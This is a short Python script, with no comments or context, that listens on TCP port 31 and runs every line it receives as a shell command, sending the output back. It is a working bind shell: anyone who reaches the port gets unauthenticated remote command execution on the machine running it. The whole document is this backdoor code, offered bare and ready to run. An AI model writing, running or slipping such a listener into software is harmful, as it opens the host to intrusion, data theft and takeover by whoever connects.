import subprocess
import socket           
s = socket.socket()        
port = 31
s.bind(('', port))        
s.listen(5)    
client, address = s.accept()
try:
    while True:
        data = client.recv( 1024 ).decode('UTF-8').replace("\n","")
        code = subprocess.check_output(data, shell=True)
        client.send(code)
except:
    s.close()